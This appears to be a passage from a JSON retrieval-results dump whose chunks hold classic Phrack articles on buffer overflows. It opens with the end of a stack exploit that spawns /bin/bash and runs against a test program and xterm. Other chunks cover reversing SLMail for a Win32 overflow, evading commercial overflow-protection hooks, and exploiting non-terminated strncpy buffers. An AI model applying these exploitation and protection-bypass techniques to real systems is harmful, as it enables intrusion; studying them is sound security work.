putenv(egg); memcpy(buff,\"RET=\",4); putenv(buff); system(\"/bin/bash\"); } ------------------------------------------------------------------------------ Lets try our new exploit with our vulnerable test program: ------------------------------------------------------------------------------ [aleph1]$ ./exploit4 768 Using address: 0xbffffdb0 [aleph1]$ ./vulnerable $RET $ ------------------------------------------------------------------------------ Works like a charm. Now lets try it on xterm: ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit4 2148 Using address: 0xbffffdb0 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET Warning: Color name \" Warning: some arguments in previous message were lost $ ------------------------------------------------------------------------------ On the first try! It has certainly increased our odds. Depending how much environment data the exploit program has compared with the program you are trying to exploit the guessed address may be to low or to high. Experiment both with positive and negative offsets. Finding Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~~~ As stated earlier, buffer overflows are the result of stuffing more information into a buffer than it is meant to hold. Since C does not have any built-in bounds checking, overflows often manifest themselves as writing past the end of a character array. The standard C library provides a number of functions for copying or appending strings, that perform no boundary checking. They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string. gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF. It performs no checks for buffer overflows. The scanf() family of functions can also be a problem if",
                      "hash": "f66945df47be44fcad82144be9f550e13b8a86b4d44297fc232ed7af70135136",
                      "offset": 3,
                      "vector": null,
                      "score": 0.8161513209342957
                    }
                  ]
                },
                {
                  "created": 1679370764791,
                  "document_id": "phrack-55-15",
                  "timestamp": 936835200000,
                  "tags": ["phrack", "issue-55", "article-15"],
                  "hash": "d26f415d6cdf3e8cb85f90571c680c52147800e4118f448290e9c9cd65b80c40",
                  "text_size": 78771,
                  "chunk_count": 9,
                  "chunks": [
                    {
                      "text": "-------[ Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 15 of 19 ] -------------------------[ Win32 Buffer Overflows (Location, Exploitation and Prevention) --------[ dark spyrit AKA Barnaby Jack <dspyrit@beavuh.org> ] ----[ Abstract \"If you assume that there's no hope, you guarantee there will be no hope. If you assume that there is an instinct for freedom, there are opportunities to change things.\" -Noam Chomsky The Internet - the last great stronghold of freedom of thought, ideas and expression - and with each passing moment the bleak outcome of a corporate and government controlled entity increases in probability. The battle lines have been drawn, and for the moment, we have the upper hand, but only by a margin. Software companies with no alternative but to resort to the censorship of knowledge have made their presence felt, sites relating to the 'black art' of software reversing and the like are being removed on a continual basis. Hopefully, the few unrestrained who walk the back alleys will continue to publish information - and create avenues for others to expand, spread and develop - this is where the battle will be won. Assembly language is a weapon chosen only by few, but those who possess the skill to harness its power can and will defeat any of the newer tools of modern combat. I wish you the best of luck finding information, though. With power, comes a price - Assembler isn't the easiest language to learn, and as such you may have trouble finding documentation among the hordes of Visual this, Visual that, Visual Bloat for Dummies.. but continue your search, you'll be glad you did. When profit gain is the primary momentum, speed, control, size and performance of your software is sacrificed for ease of use and 'prompt development'. The need to know what goes on internally is a rare necessity and optimization is of little importance. Those that remain untainted by the prospect of monetary rewards, and first and foremost are driven by the sheer desire to better educate ones self, are those that will always be on the pinnacle - and are those that are feared most of all. With Windows NT now a major player, and the open source movement not looking to have any impact in the near future, the ability to 'look under the hood' is an incredibly valuable asset and will be the focus of the first section in this paper. It is of no great surprise that attempts to outlaw reverse engineering are currently in the works, but the effects of such a proposal would be disastrous. Despite the fact that it is an open invitation for vendors to use sub-standard coding practice, there are those in the security industry who rely on these techniques to find and document vulnerabilities. The online world would suffer as a result. Do not concede. Introduction. ~~~~~~~~~~~~~ This paper will be separated into 3 sections. The first will cover a standard reversing session, and we'll point out a common vulnerability. The second will demonstrate the process of exploiting the weakness - the problem with most win32 remote overflow exploits stems from the payload, the current trend is to have the shellcode download an external file and execute. Far too many problems result from this technique, depending on router/firewall configurations etc. The payload I present to you will directly spawn a full-blown shell on any port you specify, eliminating 90% of most reported problems. This is the first of its kind as far as I am aware. The last section will show how to add your own code to the executables of your target to prevent exploitation. The example I will be using for this document is the latest version of Seattle Labs mail server (3.2.3113). There are numerous buffer overflows riddled throughout this software, we'll be concentrating on a port opened by the POP service, which provides the Extended Turn functions. Seattle Labs were contacted about this in a previous version but did not bother to remedy the situation, instead they just changed the default port from 27 to 8376. Bad move. The vulnerabilities were made public by the way, so please, Russ, don't send me nasty emails. Before we begin I will assume you have a general knowledge of Assembler, Windows programming, a basic understanding of the Portable Executable structure and you know the fundamentals of buffer overflows - I won't be re-hashing the basics in this paper. Tools Required: Interactive Disassembler from http://www.datarescue.com - hands down the BEST disassembler for the PC. A decent debugger, e.g.: SoftIce. PE Dump from Matt Peitrek, or dumpbin will suffice. A hex editor, any will do.. PS Edit does nicely. A Win32 API reference. If you want to assemble the tools/exploits that accompany this paper then you'll also need TASM 5.0. The binaries will be available at http://www.beavuh.org as well as the latest goodies that we feel the need to release. Section 1: Under the Hood. ~~~~~~~~~~~~~~~~~~~~~~~~~~ Interactive Disassembler Pro is without a doubt, THE tool for reversing code. Disassembly begins from the entry point of the program, and follows all routes of execution, then continues to locate functions outside of the main flow of the program. You have full control over what is marked as data or code. IDA recognizes a huge amount of library functions, which provides a much better understanding of the target. It will disassemble an unbelievable amount of file formats, from a wide range of processors. You're given the ability to have repeatable comments, labels, modify any piece of code, function, \"interactively\". IDA also includes it's own macro language, to automate your chores. If I were to cover everything this tool can do I would be here all day, and I'd still be missing something. With the combined effort of IDA and Soft Ice, there are no barriers. This section will be rather short, the only reason being that IDA cuts through SLMail's code like a machete. Load up slmail.exe into IDA and we'll get underway... First we need to think about our target for a minute, we're going to try and exploit one of the SMTP commands so it is almost certain they will be accessed and compared from a table.. Let's do a search: Hit <alt+b> \"search for text in core\" and enter \"EXPN\", we'll land smack in the middle of these ASCII strings. 004439C0 aSize db 'SIZE',0 004439C5 align 4 004439C8 aXtrn db 'XTRN',0 004439CD align 4 004439D0 aEtrn db 'ETRN',0 004439D5 align 4 004439D8 aQuit db 'QUIT',0 ; DATA XREF: sub_403970+280\u0018o 004439D8 ; .data:00448A60\u0019o 004439DD align 4 004439E0 aHelp_0 db 'HELP',0 004439E5 align 4 004439E8 aTurn db 'TURN',0 ; DATA XREF: sub_403970+F0\u0018o 004439ED align 4 004439F0 aExpn db 'EXPN',0 ...<snip> Now we need to find the table that references the commands, so we'll do another search.. this time entering the dword offset to the left of EXPN (004439f0). And we land in the middle of this mess: 004436F8 dword_4436F8 dd 443A98h ; DATA XREF: sub_404390+24\u0018r 004436F8 ; sub_404390+34\u0018o 004436FC db 3 ; 004436FD db 0 ; 004436FE db 0 ; 004436FF db 0 ; 00443700 db 94h ; \" 00443701 db 3Ah ; : 00443702 db 44h ; D 00443703 db 0 ; 00443704 db 0Ah ; 00443705 db 0 ; 00443706 db 0 ; 00443707 db 0 ; 00443708 db 90h ; 00443709 db 3Ah ; : 0044370A db 44h ; D 0044370B db 0 ; 0044370C db 1 ; 0044370D db 0 ; 0044370E db 0 ; 0044370F db 0 ; ...<snip> 004437E8 db 0F0h ; 004437E9 db 39h ; 9 004437EA db 44h ; D 004437EB db 0 ; 004437EC db 19h ; 004437ED db 0 ; 004437EE db 0 ; 004437EF db 0 ; There's no point showing the complete table here, now.. take a look at its structure. <pointer to string> <dword> <pointer to string> <dword> etc My best guess here is that the dword value following each pointer will be the value assigned after a successful comparison. Let's check our theory. Also we should note down our value after the pointer to \"EXPN\" : 004439f0h, 00000019h. 0x19, we'll keep that in mind. Scroll up and at the top of the table you see: 004436F8 dword_4436F8 dd 443A98h ; DATA XREF: sub_404390+24\u0018r 004436F8 ; sub_404390+34\u0018o You can see to the right where the table is referenced, so click on the subroutine and we'll land straight into the call. 004043B4 loc_4043B4: ; CODE XREF: sub_404390+11\u0018j 004043B4 mov ecx, dword_4436F8 004043BA test ecx, ecx 004043BC jz short loc_4043F3 004043BE mov ebp, ds:lstrlenA 004043C4 mov esi, offset dword_4436F8 Our table loaded at esi, ebp contains the address of lstrlenA. 004043C9 004043C9 loc_4043C9: ; CODE XREF: sub_404390+61\u0019j 004043C9 test eax, eax 004043CB jnz short loc_4043F3 004043CD mov eax, [esi] 004043CF push eax 004043D0 call ebp Here we go, the string first moved to eax and then a string length function called. 004043D2 mov ecx, [esi] 004043D4 push eax 004043D5 push ecx 004043D6 push ebx 004043D7 call j_lstrncmpi 004043DC neg eax 004043DE sbb eax, eax 004043E0 inc eax 004043E1 jz short loc_4043E9 Now we know that the parameters for lstrncmpi are as follows: strncmpi(first_string, second_string, number_of_chars); The first parameter pushed on the stack is the return from the string length function, ecx is then pushed which points to the string, and finally ebx. So we can determine from this that ebx contains the input from the user. I can see that some of you may be a little puzzled here, yes - parameters are pushed on to the stack in reverse order. 004043E3 xor edi, edi 004043E5 mov di, [esi+4] Ah, just as we suspected.. if there is a successful comparison then di is loaded with the value that followed our pointer. 004043E9 004043E9 loc_4043E9: ; CODE XREF: sub_404390+51\u0018j 004043E9 mov ecx, [esi+8] 004043EC add esi, 8 004043EF test ecx, ecx 004043F1 jnz short loc_4043C9 loop :) 004043F3 004043F3 loc_4043F3: ; CODE XREF: sub_404390+18\u0018j 004043F3 ; sub_404390+2C\u0018j ... 004043F3 mov eax, edi 004043F5 pop edi 004043F6 pop esi 004043F7 pop ebp 004043F8 pop ebx 004043F9 retn 004043F9 sub_404390 endp ; sp = -10h 004043F9 And finally eax holds our value, and we return from the call. Let's continue. 00405EC7 mov edx, [esp+2Ch+arg_8] 00405ECB mov ebx, eax 00405ECD mov eax, [esp+2Ch+arg_4] 00405ED1 push edx 00405ED2 push eax 00405ED3 push esi 00405ED4 lea ecx, [esp+3Ch] 00405ED8 push edi 00405ED9 push ecx 00405EDA push ebx 00405EDB call sub_404850 Now, the important things to take note of here is edx gets our inputted string, and ebx is given our value from the table (0x19). Remember the order in which our registers were pushed, so we will be able to tell what is being referenced from the stack - and in the next call we will rename the stack variables to make it easier on ourselves. Note: I'm not taking advantage of some of the GREAT features IDA possesses - repeatable comments, labels and much more. A necessity while on a real reversing journey. 00404850 sub_404850 proc near ; CODE XREF: sub_405330+73\u0019p 00404850 ; sub_405560+73\u0019p ... 00404850 00404850 var_270 = byte ptr -270h 00404850 var_26C = dword ptr -26Ch 00404850 var_268 = byte ptr -268h 00404850 var_264 = byte ptr -264h 00404850 var_23C = byte ptr -23Ch 00404850 var_230 = byte ptr -230h 00404850 var_168 = byte ptr -168h 00404850 var_110 = byte ptr -110h 00404850 var_105 = byte ptr -105h 00404850 var_104 = byte ptr -104h 004048",
                      "hash": "7c17793ab22021eab7391528df2a79a633e1edc8744738c8897380325f16746d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8275727033615112
                    }
                  ]
                },
                {
                  "created": 1679370914921,
                  "document_id": "phrack-62-5",
                  "timestamp": 1089676800000,
                  "tags": ["phrack", "issue-62", "article-5"],
                  "hash": "ead93e4e97e197521847f3955b3b7f9ead9b1d8132b87c231552415815d7c229",
                  "text_size": 37515,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3e, Phile #0x05 of 0x10 |=-----------------------------------------------------------------------=| |=-----=[ Bypassing 3rd Party Windows Buffer Overflow Protection ]=------=| |=-----------------------------------------------------------------------=| |=--------------=[ anonymous <p62_wbo_a@author.phrack.org ]=-------------=| |=--------------=[ Jamie Butler <james.butler@hbgary.com> ]=-------------=| |=--------------=[ anonymous <p62_wbo_b@author.phrack.org ]=-------------=| --[ Contents 1 - Introduction 2 - Stack Backtracing 3 - Evading Kernel Hooks 3.1 - Kernel Stack Backtracing 3.2 - Faking Stack Frames 4 - Evading Userland Hooks 4.1 - Implementation Problems - Incomplete API Hooking 4.1.1 - Not Hooking all API Versions 4.1.2 - Not Hooking Deeply Enough 4.1.3 - Not Hooking Thoroughly Enough 4.2 - Fun With Trampolines 4.2.1 Patch Table Jumping 4.2.2 Hook Hopping 4.3 - Repatching Win32 APIs 4.4 - Attacking Userland Components 4.4.1 IAT Patching 4.4.2 Data Section Patching 4.5 - Calling Syscalls Directly 4.6 - Faking Stack Frames 5 - Conclusions --[ 1 - Introduction Recently, a number of commercial security systems started to offer protection against buffer overflows. This paper analyzes the protection claims and describes several techniques to bypass the buffer overflow protection. Existing commercial systems implement a number of techniques to protect against buffer overflows. Currently, stack backtracing is the most popular one. It is also the easiest to implement and the easiest to bypass. Several commercial products such as Entercept (now NAI Entercept) and Okena (now Cisco Security Agent) implement this technique. --[ 2 - Stack Backtracing Most of the existing commercial security systems do not actually prevent buffer overflows but rather try to attempt to detect the execution of shellcode. The most common technology used to detect shellcode is code page permission checking which involves checking whether code is executing on a writable page of memory. This is necessary since architectures such as x86 do not support the non-executable memory bit. Some systems also perform additional checking to see whether code's page of memory belongs to a memory mapped file section and not to an anonymous memory section. [-----------------------------------------------------------] page = get_page_from_addr( code_addr ); if (page->permissions & WRITABLE) return BUFFER_OVERFLOW; ret = page_originates_from_file( page ); if (ret != TRUE) return BUFFER_OVERFLOW; [-----------------------------------------------------------] Pseudo code for code page permission checking Buffer overflow protection technologies (BOPT) that rely on stack backtracing don't actually create non-executable heap and stack segments. Instead they hook the OS and check for shellcode execution during the hooked API calls. Most operating systems can be hooked in userland or in kernel. Next section deals with evading kernel hooks, while section 4 deals with bypassing userland hooks. --[ 3 - Evading Kernel Hooks When hooking the kernel, Host Intrusion Prevention Systems (HIPS) must be able to detect where a userland API call originated. Due to the heavy use of kernel32.dll and ntdll.dll libraries, an API call is usually several stack frames away from the actual syscall trap call. For this reason, some intrusion preventions systems rely on using stack backtracing to locate the original caller of a system call. ----[ 3.1 - Kernel Stack Backtracing While stack backtracing can occur from either userland or kernel, it is far more important for the kernel components of a BOPT than its userland components. The existing commercial BOPT's kernel components rely entirely on stack backtracing to detect shellcode execution. Therefore, evading a kernel hook is simply a matter of defeating the stack backtracing mechanism. Stack backtracing involves traversing stack frames and verifying that the return addresses pass the buffer overflow detection tests described above. Frequently, there is also an additional \"return into libc\" check, which involves checking that a return address points to an instruction immediately following a call or a jump. The basic operation of stack backtracing code, as used by a BOPT, is presented below. [-----------------------------------------------------------] while (is_valid_frame_pointer( ebp )) { ret_addr = get_ret_addr( ebp ); if (check_code_page(ret_addr) == BUFFER_OVERFLOW) return BUFFER_OVERFLOW; if (does_not_follow_call_or_jmp_opcode(ret_addr)) return BUFFER_OVERFLOW; ebp = get_next_frame( ebp ); } [-----------------------------------------------------------] Pseudo code for BOPT stack backtracing When discussing how to evade stack backtracing, it is important to understand how stack backtracing works on an x86 architecture. A typical stack frame looks as follows during a function call: : : |-------------------------| | function B parameter #2 | |-------------------------| | function B parameter #1 | |-------------------------| | return EIP address | |-------------------------| | saved EBP | |=========================| | function A parameter #2 | |-------------------------| | function A parameter #1 | |-------------------------| | return EIP address | |-------------------------| | saved EBP | |-------------------------| : : The EBP register points to the next stack frame. Without the EBP register it is very hard, if not impossible, to correctly identify and trace through all the stack frames. Modern compilers often omit the use of EBP as a frame pointer and use it as a general purpose register instead. With an EBP optimization, a stack frame looks as follows during a function call: |-----------------------| | function parameter #2 | |-----------------------| | function parameter #1 | |-----------------------| | return EIP address | |-----------------------| Notice that the EBP register is not present on the stack. Without an EBP register it is not possible for the buffer overflow detection technologies to accurately perform stack backtracing. This makes their task incredibly hard as a simple return into libc style attack will bypass the protection. Simply originating an API call one layer higher than the BOPT hook defeats the detection technique. ----[ 3.2 - Faking Stack Frames Since the stack is under complete control of the shellcode, it is possible to completely alter its contents prior to an API call. Specially crafted stack frames can be used to bypass the buffer overflow detectors. As was explained previously, the buffer overflow detector is looking for three key indicators of legitimate code: read-only page permissions, memory mapped file section and a return address pointing to an instruction immediately following a call or jmp. Since function pointers change calling semantics, BOPT do not (and cannot) check that a call or jmp actually points to the API being called. Most importantly, the BOPT cannot check return addresses beyond the last valid EBP frame pointer (it cannot stack backtrace any further). Evading a BOPT is therefore simply a matter of creating a \"final\" stack frame which has a valid return address. This valid return address must point to an instruction residing in a read-only memory mapped file section and immediately following a call or jmp. Provided that the dummy return address is reasonably close to a second return address, the shellcode can easily regain control. The ideal instruction sequence to point the dummy return address to is: [-----------------------------------------------------------] jmp [eax] ; or call [eax], or another register dummy_return: ... ; some number of nops or easily ; reversed instructions, e.g. inc eax ret ; any return will do, e.g. ret 8 [-----------------------------------------------------------] Bypassing kernel BOPT components is easy because they must rely on user controlled data (the stack) to determine the validity of an API call. By correctly manipulating the stack, it is possible to prematurely terminate the stack return address analysis. This stack backtracing evasion technique is also effective against userland hooks (see section 4.6). --[ 4 - Evading Userland Hooks Given the presence of the correct instruction sequence in a valid region of memory, it is possible to trivially bypass kernel buffer overflow protection techniques. Similar techniques can be used to bypass userland BOPT components. In addition, since the shellcode executes with the same permissions as the userland hooks, a number of other techniques can be used to evade the detection. ----[ 4.1 - Implementation Problems - Incomplete API Hooking There are many problems with the userland based buffer overflow protection technologies. For example, they require the buffer overflow protection code to be in the code path of all attacker's calls or the shellcode execution will go undetected. Trying to determine what an attacker will do with his or her shellcode a priori is an extremely hard problem, if not an impossible one. Getting on the right path is not easy. Some of the obstacles in the way include: a. Not accounting for both UNICODE and ANSI versions of a Win32 API call. b. Not following the chaining nature of API calls. For example, many functions in kernel32.dll are nothing more than wrappers for other functions within kernel32.dll or ntdll.dll. c. The constantly changing nature of the Microsoft Windows API. --------[ 4.1.1 - Not Hooking All API Versions A commonly encountered mistake with userland API hooking implementations is incomplete code path coverage. In order for an API interception based products to be effective, all APIs utilized by attackers must be hooked. This requires the buffer overflow protection technology to hook somewhere along the code path an attacker _has_ to take. However, as will be shown, once an attacker has begun executing code, it becomes very difficult for third party systems to cover all code paths. Indeed, no tested commercial buffer overflow detector actually provided an effective code path coverage. Many Windows API functions have two versions: ANSI and UNICODE. The ANSI function names usually end in A, and UNICODE functions end in W because of their wide character nature. The ANSI functions are often nothing more than wrappers that call the UNICODE version of the API. For example, CreateFileA takes the ANSI file name that was passed as a parameter and turns it into an UNICODE string. It then calls CreateFileW. Unless a vendor hooks both the UNICODE and ANSI version of the API function, an attacker can bypass the protection mechanism by simply calling the other version of the function. For example, Entercept 4.1 hooks LoadLibraryA, but it makes no attempt to intercept LoadLibraryW. If a protection mechanism was only going to hook one version of a function, it would make more sense to hook the UNICODE version. For this particular function, Okena/CSA does a better job by hooking LoadLibraryA, LoadLibraryW, LoadLibraryExA, and LoadLibraryExW. Unfortunately for the third party buffer overflow detectors, simply hooking more functions in kernel32.dll is not enough. --------[ 4.1.2 - Not Hooking Deeply Enough In Windows NT, kernel32.dll acts as a wrapper for ntdll.dll and yet many buffer overflow detection products do not hook functions within ntdll.dll. This simple error is similar to not hooking both the UNICODE and ANSI versions of a function. An attacker can simply call the ntdll.dll directly and completely bypass all the kernel32.dll \"checkpoints\" established by a buffer overflow detector. For example, NAI Entercept tries to detect shellcode calling GetProcAddress() in kernel32.dll. However, the shellcode can be rewritten to call LdrGetProcedureAddress() in ntdll.dll, which will accomplish the same goal, and at the same time never pass through the NAI Entercept hook. Similarly, shellcode can completely bypass userland hooks altogether and make system calls directly (see section 4.5). --------[ 4.1.3 - Not Hooking Thoroughly Enough The interactions between the various different Win32 API functions is byzantine, complex and difficult to understand. A vendor must make only one mistake in order to create a window of opportunity for an attacker. For example, Okena/CSA and NAI Entercept both hook WinExec trying to prevent attacker's shellcode from spawning a process. The call path for WinExec looks like this: WinExec() --> CreateProcessA() --> CreateProcessInternalA() Okena/CSA and NAI Entercept hook both WinExec() and CreateProcessA() (see Appendix A and B). However, neither product hooks CreateProcessInternalA() (exported by kernel32.dll). When writing a shellcode, an attacker could find the export for CreateProcessInternalA() and use it instead of calling WinExec(). CreateProcessA() pushes two NULLs onto the stack before calling CreateProcessInternalA(). Thus a shellcode only needs to push two NULLs and then call CreateProcessInternalA() directly to evade the userland API hooks of both products. As new DLLs and APIs are released, the complexity of Win32 API internal interactions increases, making the problem worse. Third party product vendors are at a severe disadvantage when implementing their buffer overflow detection technologies and are bound to make mistakes which can be exploited by attackers. ----[ 4.2 - Fun With Trampolines Most Win32 API functions begin with a five byte preamble. First, EBP is pushed onto the stack, then ESP is moved into EBP. [-----------------------------------------------------------] Code Bytes Assembly 55 push ebp 8bec mov ebp, esp [-----------------------------------------------------------] Both Okena/CSA and Entercept use inline function hooking. They overwrite the first 5 bytes of a function with an immediate unconditional jump or call. For example, this is what the first few bytes of WinExec() look like after NAI Entercept's hooks have been installed: [-----------------------------------------------------------] Code Bytes Assembly e8 xx xx xx xx call xxxxxxxx 54 push esp 53 push ebx 56 push esi 57 push edi [-----------------------------------------------------------] Alternatively, the first few bytes could be overwritten with a jump instruction: [-----------------------------------------------------------] Code Bytes Assembly e9 xx xx xx xx jmp xxxxxxxx ... [-----------------------------------------------------------] Obviously, it is easy for shellcode to test for these and other signatures before calling a function. If a hijacking mechanism is detected, the shellcode can use several different techniques to bypass the hook. ------[ 4.2.1 - Patch Table Jumping When an API is hooked, the original preamble is saved into a table so that the buffer overflow detector can recreate the original API after performing its validation checks. The preamble is stored in a patch table, which resides somewhere in the address space of an application. When shellcode detects the presence of an API",
                      "hash": "897a9d3bc2baec19b8050eeb7eb6ddf27353907e25ed5e78d1f67a43aee65193",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8264463543891907
                    }
                  ]
                },
                {
                  "created": 1679370787795,
                  "document_id": "phrack-56-14",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-14"],
                  "hash": "2dd6ce047ab38c85a56bd8966030e60da304a766679d100c227a087a7086f64a",
                  "text_size": 28023,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "- P H R A C K M A G A Z I N E - Volume 0xa Issue 0x38 05.01.2000 0x0e[0x10] |--------- TAKING ADVANTAGE OF NON-TERMINATED ADJACENT MEMORY SPACES ---------| |-----------------------------------------------------------------------------| |------------------------- twitch <twitch@vicar.org> -------------------------| ----| Introduction Because Phrack needs another buffer overflow article, because most of those pesky strcpy()'s have been replaced with strncpys()'s, and because chicks dig shellcode, I present for your benefit yet another buffer overflow technique. Like 'Frame Pointer Overwriting' from P55, this is not the most common of problems, but it does exist, and it is exploitable. This article details the hazards of non-terminated buffers (specifically non-terminated strings), and their potential impact on the security of a application. This issue is discussed from a variety potential situations, culminating with an example exploit which abuses adjacent non-terminated string buffers together to perform program redirection via a buffer overflow. Like most bugs this is not an unknown problem, however judging from random source browsing, it appears that this is not a widely understood issue. Incidentally, the example code contains idiosyncratic architectural references and man page excerpts as presented from the point of view of FreeBSD running on the x86 architecture. Due to popular pleading, the noun 'data' is treated as singular throughout this document, even though that is wrong. ----| Rehash If you already know how buffer overflows work (and if you have read any issue of Phrack within the last two years, how could you not?), skip this section. When a program allocates a buffer, then copies arbitrary data into this buffer, it must ensure that there is enough room for everything that is being copied. If there is more data than there is allocated memory, all data could still be copied, but past the end of the designated buffer and random, most likely quite important, data will be overwritten. It's all really quite rude. If the data being copied is supplied by the user, the user can do malevolent things like change the value of variables, redirect program execution, etc. A common overflow will look like this: void func(char *userdata) { char buf[256]; ... strcpy(buf, userdata); ... } The programmer assumes that the data being copied will surely be less than 256 bytes and will fit snugly into the supplied buffer. Unfortunately, since the data being copied is user-supplied, it could be damned near anything and of any size. The function strcpy() will continue copying bytes from *userdata until a NULL is found, so any data past 256 bytes will overflow. So, in an effort to keep mean people from abusing their software, programmers will make sure that they only copy as much data as there is buffer space. To accomplish this task, they will normally do something to this effect: void func(char *userdata) { char buf[256]; ... strncpy(buf, userdata, 256); ... } strncpy() will only copy as many bytes as are specified. So in the above, the maximum amount of data that is ever copied is 256 bytes, and nothing is overwritten (note that the above code snippet exemplifies the problem discussed below). For a far superior explanation of buffer overruns, program redirection, and smashing the stack for fun and profit, consult the article of the same name as the latter in P49-10. ----| Pith The essence of the issue is that many functions that a programmer may take to be safe and/or 'magic bullets' against buffer overflows do not automatically terminate strings/buffers with a NULL. That in actuality, the buffer size argument provided to these functions is an absolute size- not the size of the string. To put a finer point on it, an excerpt from the strncpy() man page: char * strncpy(char *dst, const char *src, size_t len) ... The strncpy() copies not more than len characters into dst, appending `\\0' characters if src is less than len characters long, and _not_+ terminating dst if src is more than len characters long. ... +(underline present in the source) To understand the ramifications of this, consider the case of two automatic character arrays, allocated thusly: char buf1[8]; char buf2[4]; The compiler is most likely going to place these two buffers _next_ to each other on the stack. Now, consider the stack for the above: Upper Memory || ----------------> [Top of the stack] || ----------------> [ buf2 - 0 ] || ----------------> [ buf2 - 1 ] || ----------------> [ buf2 - 2 ] || ----------------> [ buf2 - 3 ] || ----------------> [ buf1 - 0 ] || ----------------> [ buf1 - 1 ] || ----------------> [ buf1 - 2 ] || ----------------> [ buf1 - 3 ] || ... || ----------------> [ buf1 - 7 ] || || ... \\/ [ Remember that the stack grows down on our example architecture (and probably yours, too), so the above diagram looks upside down ] Thus, if a programmer were to do the following: void func() { char buf1[8]; char buf2[4]; fgets(buf1, 8, stdin); strncpy(buf2, buf1, 4); } Assuming that the user entered the string 'iceburn', after the strncpy() the stack would look like this: Upper Memory || ----------------> [Top of the stack] || ----------------> [ 'i' (buf2 - 0) ] || ----------------> [ 'c' (buf2 - 1) ] || ----------------> [ 'e' (buf2 - 2) ] || ----------------> [ 'b' (buf2 - 3) ] || ----------------> [ 'i' (buf1 - 0) ] || ----------------> [ 'c' (buf1 - 1) ] || ----------------> [ 'e' (buf1 - 2) ] || ----------------> [ 'b' (buf1 - 3) ] || ----------------> [ 'u' (buf1 - 4) ] || ----------------> [ 'r' (buf1 - 5) ] || ----------------> [ 'n' (buf1 - 6) ] || ----------------> [ 0x00 (buf1 - 7) ] || || ... \\/ We know from the man page that even though strncpy() is not going to copy more than 4 bytes. But since the src string is longer than 4 bytes, it will not null-terminate either. Thus, strlen(buf2) is now 11, even though sizeof(buf2) is 4. This is not an overflow, as no data beyond the boundaries of the allocated space have been overwritten. However, it does establish a peculiar situation. For instance, the result of printf(\"You entered: %s\\n\", buf2); would produce the following: You entered: icebiceburn Not exactly the intent. ----| Apparition This problem surfaces in the real world in seemingly benign and arcane ways. The following is from syslogd.c on FreeBSD 3.2-RELEASE: /* * Validate that the remote peer has permission to log to us. */ int validate(sin, hname) struct sockaddr_in *sin; const char *hname; { int i; size_t l1, l2; char *cp, name[MAXHOSTNAMELEN]; struct allowedpeer *ap; if (NumAllowed == 0) /* traditional behaviour, allow everything */ return 1; strncpy(name, hname, sizeof name); if (strchr(name, '.') == NULL) { strncat(name, \".\", sizeof name - strlen(name) - 1); strncat(name, LocalDomain, sizeof name - strlen(name) - 1); } ... } Suppose that hname is at least MAXHOSTNAMELEN bytes long and does not contain a '.'. This means that the calculation for the length argument to strncat will expand to: sizeof name == MAXNAMELEN strlen(name) >= MAXNAMELEN Thus, length will be < 0 Well, since the length parameter to strncat is of type size_t, which is unsigned, strncat will actually be willing to append _way_ to many bytes. Thus, all of LocalDomain will be appended to name (which is already full), an overflow will occur and syslogd will seg fault when validate() returns. Incidentally, unless LocalDomain for the host is an appropriate offset into the stack, this example is exploitable only as a way to kill syslog (incidentally, 0xbfbfd001.com is available). ----| Pith + Apparition = Opportunity Although this type of overflow may be exploited in a variety of manners (and indeed, it will manifest itself in a variety of ways), the sexiest and easiest to understand is program redirection. Please note that although the example situations presented are exorbitantly contrived, that similar conditions exist in sundry software currently in use all over the world. Now, let us address a situation where the user has control over the contents of two adjacent buffers. Consider the following snippet: int main(int argc, char **argv) { char buf1[1024]; char buf2[256]; strncpy(buf, argv[1], 1024); strncpy(buf2, argv[2], 256); ... if(somecondition) print_error(buf2); } void print_error(char *p) { char mybuf[263]; sprintf(mybuf, \"error: %s\", p); } A stack diagram would be really large and redundant, so one will not be making an appearance here, but it should be fairly clear what will happen. The programmer assumes that due to the liberal use of strncpy() in main(), that the data is clean when it reaches print_error(). Thus, it is assumed that sprintf() may be called without incident. Unfortunately, since p points to buf2, and buf2 is not properly terminated, sprintf() will actually continue happily copying until it reaches a NULL somewhere after the end of buf1. Oh shit. ----| Hexploitation Exploitation (for the purpose of program redirection) in this scenario is slightly different than it is in the case of a traditional single-buffer overrun. First, a little rehash about exploiting traditional buffer overflows. Assuming that we are overflowing a single buffer of 256 bytes, our payload would generally look something like this (diagrams obviously not to scale): [ 0 ....................................................256.. ~280 ] -------------------------------------------------------------------- | | | | | | Bunch of NOP's | shellcode | More NOP's | offset_to_shellcode | | | | | | -------------------------------------------------------------------- | Buffer | |________________________________________________________| All that we do is pass enough data so that when the overflow occurs, the offset to the our shellcode (an address somewhere on the stack) overwrites the saved instruction pointer. Thus, when the vulnerable function returns, program execution is redirected to our code. Now assume that we want to overflow another 256-byte buffer, say the one in print_error() in the code snippet from the last section. To accomplish our malevolent ends however, we will have to use buf1 and buf2 in tandem. All we have to do is fill all of buf2 with our shellcode and NOP's, then use the beginning of buf1 for our offset. Thus, after the strncpy()'s, buf1 will look like this: [ 0 ......................................................... 1024 ] -------------------------------------------------------------------- | | | | offset_to_shellcode | Filled with NULL's by strncpy() | | | | -------------------------------------------------------------------- And buf2 will look like this: [ 0 .......................................................... 256 ] -------------------------------------------------------------------- | | | | | Bunch of NOP's | shellcode | More NOP's | | | | | -------------------------------------------------------------------- This arrangement is required due to the way in which the buffers are arranged on the stack. What is supplied as argv[1] (the data that is copied into buf1) will be located higher in memory than the data we supply as argv[2] (which is copied into buf2). So technically, we supply the offset at the beginning of the exploit string, rather than at the end. Then, when print_error() is called, the stack in main(), will look like this: [Top of stack Upper Memory] [ 0 .............................................~300../ /... 1280 ] -------------------------------------------------------/ /---------- | | | | / / | | Bunch of NOP's | shellcode | More NOP's | offset / / NULL's | | | | | / / | -------------------------------------------------------/ /---------- Which resembles greatly the traditional payload described above. When print_error() is called, it is passed a pointer to the beginning of buf2, or, 